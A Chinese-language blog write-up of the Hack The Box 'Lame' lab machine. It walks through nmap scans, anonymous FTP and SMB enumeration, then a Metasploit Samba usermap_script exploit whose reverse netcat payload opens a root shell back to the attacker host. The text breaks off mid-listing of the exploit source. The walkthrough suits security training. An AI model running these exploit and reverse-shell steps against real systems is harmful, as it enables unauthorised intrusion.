<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>HTB靶机 Lame WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="author-link" content="">
<meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='HTB, OSCP' /><meta itemprop="name" content="HTB靶机 Lame WriteUp">
<meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-03-23T17:47:01+08:00" />
<meta itemprop="dateModified" content="2022-03-23T17:47:01+08:00" />
<meta itemprop="wordCount" content="3513">
<meta itemprop="keywords" content="HTB,OSCP," /><meta property="og:title" content="HTB靶机 Lame WriteUp" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.bthoughts.top/posts/hackthebox-lame/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-23T17:47:01+08:00" />
<meta property="article:modified_time" content="2022-03-23T17:47:01+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB靶机 Lame WriteUp"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/hackthebox-lame/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" /><link rel="prev" href="https://www.bthoughts.top/posts/hackthebox-legacy/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" /><link rel="next" href="https://www.bthoughts.top/posts/hackthebox-blue/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "HTB靶机 Lame WriteUp",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/www.bthoughts.top\/posts\/hackthebox-lame\/htb%E9%9D%B6%E6%9C%BA-lame-writeup\/"
    },"genre": "posts","keywords": "HTB, OSCP","wordcount":  3513 ,
    "url": "https:\/\/www.bthoughts.top\/posts\/hackthebox-lame\/htb%E9%9D%B6%E6%9C%BA-lame-writeup\/","datePublished": "2022-03-23T17:47:01+08:00","dateModified": "2022-03-23T17:47:01+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                
                
              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tools/"
                
                
              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  
                  
                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tools/"
                  
                  
                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>HTB靶机 Lame WriteUp</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
      <div class="post-meta-line"><span title=2022-03-23&#32;17:47:01><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-23">2022-03-23</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3513 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pentest">Pentest</a></li>
    <li><a href="#0scan">0.SCAN</a></li>
    <li><a href="#1ftp">1.ftp</a></li>
    <li><a href="#2ssh">2.ssh</a></li>
    <li><a href="#3smb">3.SMB</a>
      <ul>
        <li><a href="#msf">MSF</a></li>
        <li><a href="#非msf">非MSF</a></li>
        <li><a href="#github">Github</a></li>
        <li><a href="#crackmapexec">crackmapexec</a></li>
      </ul>
    </li>
    <li><a href="#4-distccd">4. distccd</a>
      <ul>
        <li><a href="#提权1suid---nmap">提权1：SUID - nmap</a></li>
        <li><a href="#提权2ssh-key">提权2：ssh key</a></li>
        <li><a href="#提权3--unrealircd-backdoored">提权3 : UnrealIRCd Backdoored</a></li>
      </ul>
    </li>
    <li><a href="#他山之石">他山之石</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h1 id="lame">Lame</h1>
<p><img loading="lazy" src="/resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174730154.png" srcset="/resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174730154.png, /resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174730154.png 1.5x, /resource/HTB%e9%9d%b6%e6%9c%ba-Lame-WriteUp.assets/640-20230220174730154.png 2x" sizes="auto" data-title="图片" data-alt="图片" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>简介：</p>
<blockquote>
<p>Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement</p>
</blockquote>
<p>Tags：</p>
<blockquote>
<p>Injection,  CMS Exploit,  Linux,  Web,  PHP,  Password Reuse</p>
</blockquote>
<p>Rating: 4.4</p>
<p>Skills：</p>
<ul>
<li>Linux基础</li>
<li>枚举端口和服务</li>
<li>识别有漏洞的服务</li>
<li>利用Samba漏洞</li>
</ul>
<h2 id="pentest">Pentest</h2>
<h2 id="0scan">0.SCAN</h2>
<p>扫下IP：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo nmap -sSV -T4  10.10.10.3 
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-16 14:43 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> Not shown: <span class="m">996</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl"> PORT   STATE SERVICE     VERSION
</span></span><span class="line"><span class="cl"> 21/tcp open ftp         vsftpd 2.3.4
</span></span><span class="line"><span class="cl"> 22/tcp open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"> 139/tcp open netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl"> 445/tcp open netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl"> Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id="1ftp">1.ftp</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo nmap -T4 -sC -p21 10.10.10.3         
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-16 14:47 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> PORT   STATE SERVICE
</span></span><span class="line"><span class="cl"> 21/tcp open ftp
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> ftp-syst: 
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   STAT: 
</span></span><span class="line"><span class="cl"> <span class="p">|</span> FTP server status:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Connected to 10.10.14.2
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Logged in as ftp
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     TYPE: ASCII
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     No session bandwidth limit
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Session timeout in seconds is <span class="m">300</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Control connection is plain text
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Data connections will be plain text
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     vsFTPd 2.3.4 - secure, fast, stable
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_End of status
</span></span></code></pre></div><p>匿名登录ftp查看一下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ ftp 10.10.10.3 
</span></span><span class="line"><span class="cl"> Connected to 10.10.10.3.
</span></span><span class="line"><span class="cl"> <span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
</span></span><span class="line"><span class="cl"> Name <span class="o">(</span>10.10.10.3:xavier<span class="o">)</span>: anonymous
</span></span><span class="line"><span class="cl"> <span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl"> Password:
</span></span><span class="line"><span class="cl"> <span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl"> Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl"> Using binary mode to transfer files.
</span></span><span class="line"><span class="cl"> ftp&gt; ls
</span></span><span class="line"><span class="cl"> <span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"> <span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl"> <span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl"> ftp&gt; <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"> <span class="m">257</span> <span class="s2">&#34;/&#34;</span>
</span></span><span class="line"><span class="cl"> ftp&gt; bye
</span></span><span class="line"><span class="cl"> <span class="m">421</span> Timeout.
</span></span></code></pre></div><p>尝试vsftp对应的漏洞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ locate *.nse <span class="p">|</span> grep vsftp
</span></span><span class="line"><span class="cl"> /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
</span></span><span class="line"><span class="cl"> $ sudo nmap --script ftp-vsftpd-backdoor.nse -p21 10.10.10.3 -T4 -sSV   
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-16 15:50 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl"> 21/tcp open ftp     vsftpd 2.3.4
</span></span><span class="line"><span class="cl"> Service Info: OS: Unix
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 24.22 seconds
</span></span></code></pre></div><p>该漏洞不存在，转向ssh和smb</p>
<h2 id="2ssh">2.ssh</h2>
<p>试着爆破一下，没发现可以利用的点。</p>
<h2 id="3smb">3.SMB</h2>
<h3 id="msf">MSF</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> msf6 &gt; search samba
</span></span><span class="line"><span class="cl"> msf6 &gt; use exploit/multi/samba/usermap_script
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> rhosts 10.10.10.3
</span></span><span class="line"><span class="cl"> <span class="nv">rhosts</span> <span class="o">=</span>&gt; 10.10.10.3
</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.10.14.2
</span></span><span class="line"><span class="cl"> <span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.2
</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.2:4444 
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.2:4444 -&gt; 10.10.10.3:32875 <span class="o">)</span> at 2022-03-16 16:04:23 +0800
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> whoami
</span></span><span class="line"><span class="cl"> root
</span></span><span class="line"><span class="cl"> find / -name <span class="s2">&#34;user.txt&#34;</span>
</span></span><span class="line"><span class="cl"> /home/makis/user.txt
</span></span><span class="line"><span class="cl"> cat /home/makis/user.txt
</span></span><span class="line"><span class="cl"> 83bb7c7fff163562d48ac4ba14316025
</span></span><span class="line"><span class="cl"> cat /root/root.txt
</span></span><span class="line"><span class="cl"> 848a15387ca22dcf38b1cdc8538223a0
</span></span></code></pre></div><p>不用MSF怎么解决呢？</p>
<p>试试nmap的nse漏洞脚本，无果</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ sudo nmap --script smb-vuln* -p139,445 10.10.10.3 -T4
</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-16 16:38 HKT
</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.3
</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> PORT   STATE SERVICE
</span></span><span class="line"><span class="cl"> 139/tcp open netbios-ssn
</span></span><span class="line"><span class="cl"> 445/tcp open microsoft-ds
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Host script results:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-061: <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-regsvc-dos: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 175.81 seconds
</span></span></code></pre></div><h3 id="非msf">非MSF</h3>
<p>信息搜集，寻找历史漏洞</p>
<p>确定Samba具体版本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ smbclient -L 10.10.10.3
</span></span><span class="line"><span class="cl"> protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
</span></span><span class="line"><span class="cl">                                                                                                                                                  
</span></span><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl"> └─$ smbclient -L 10.10.10.3 -U <span class="s2">&#34;&#34;</span> -N --option<span class="o">=</span><span class="s1">&#39;client min protocol=nt1&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        Sharename       Type     Comment
</span></span><span class="line"><span class="cl">         ---------       ----      -------
</span></span><span class="line"><span class="cl">        print$         Disk     Printer Drivers
</span></span><span class="line"><span class="cl">        tmp             Disk     oh noes!
</span></span><span class="line"><span class="cl">        opt             Disk      
</span></span><span class="line"><span class="cl">        IPC$           IPC       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl">        ADMIN$         IPC       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"> Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        Server               Comment
</span></span><span class="line"><span class="cl">         ---------            -------
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        Workgroup           Master
</span></span><span class="line"><span class="cl">         ---------            -------
</span></span><span class="line"><span class="cl">        WORKGROUP           LAME
</span></span></code></pre></div><p>关于smbclient出现NT_STATUS_CONNECTION_DISCONNECTED错误</p>
<p>smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协商,解决办法如上，通过option指定，也可以修改配置文件 <code>/etc/samba/smb.conf</code></p>
<p><strong>crackmapexec 探测</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ crackmapexec smb --shares 10.10.10.3 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>                
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> First <span class="nb">time</span> use detected                                        
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Creating home directory structure                               
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Creating default workspace                                      
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Initializing MSSQL protocol database                            
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Initializing SMB protocol database                              
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Initializing LDAP protocol database                           
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Initializing WINRM protocol database                            
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Initializing SSH protocol database                              
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Copying default configuration file                              
</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Generating SSL certificate                                     
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             <span class="o">[</span>*<span class="o">]</span> Unix <span class="o">(</span>name:LAME<span class="o">)</span> <span class="o">(</span>domain:hackthebox.gr<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>                     
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             <span class="o">[</span>+<span class="o">]</span> hackthebox.gr<span class="se">\:</span>  
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             <span class="o">[</span>+<span class="o">]</span> Enumerated shares 
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             Share           Permissions     Remark                                                       
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             -----           -----------     ------                                                       
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             print$                         Printer Drivers                                              
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             tmp             READ,WRITE     oh noes!                                                     
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             opt           
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             IPC$                           IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>              
</span></span><span class="line"><span class="cl"> SMB         10.10.10.3      <span class="m">445</span>   LAME             ADMIN$                         IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</span></span></code></pre></div><p>确定Samba 版本为 3.0.20，就可以找相应的漏洞。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ searchsploit samba 3.0.20
</span></span><span class="line"><span class="cl"> $ searchsploit samba 3.0.20
</span></span><span class="line"><span class="cl"> -------------------------------------------------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">  Exploit Title                                                                         <span class="p">|</span> Path                           
</span></span><span class="line"><span class="cl"> -------------------------------------------------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                 <span class="p">|</span> multiple/remote/10095.txt
</span></span><span class="line"><span class="cl"> Samba 3.0.20 &lt; 3.0.25rc3 - <span class="s1">&#39;Username&#39;</span> map script<span class="s1">&#39; Command Execution (Metasploit)       | unix/remote/16320.rb
</span></span></span><span class="line"><span class="cl"><span class="s1"> Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
</span></span></span><span class="line"><span class="cl"><span class="s1"> Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
</span></span></span><span class="line"><span class="cl"><span class="s1"> Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                           | linux_x86/dos/36741.py
</span></span></span><span class="line"><span class="cl"><span class="s1"> -------------------------------------------------------------------------------------------------------------------------
</span></span></span><span class="line"><span class="cl"><span class="s1"> Shellcodes: No Results
</span></span></span><span class="line"><span class="cl"><span class="s1"> 
</span></span></span><span class="line"><span class="cl"><span class="s1"> $ more /usr/share/exploitdb/exploits/unix/remote/16320.rb
</span></span></span><span class="line"><span class="cl"><span class="s1"> ......
</span></span></span><span class="line"><span class="cl"><span class="s1">                         &#39;</span>Author<span class="s1">&#39;         =&gt; [ &#39;</span>jduck<span class="s1">&#39; ],
</span></span></span><span class="line"><span class="cl"><span class="s1">                         &#39;</span>License<span class="s1">&#39;        =&gt; MSF_LICENSE,
</span></span></span><span class="line"><span class="cl"><span class="s1">                         &#39;</span>Version<span class="s1">&#39;        =&gt; &#39;</span><span class="nv">$Revision</span>: <span class="m">10040</span> <span class="s1">$&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">                         &#39;</span>References<span class="s1">&#39;     =&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                                [ 
</span></span></span><span class="line"><span class="cl"><span class="s1">                                        [ &#39;</span>CVE<span class="s1">&#39;, &#39;</span>2007-2447<span class="s1">&#39; ],
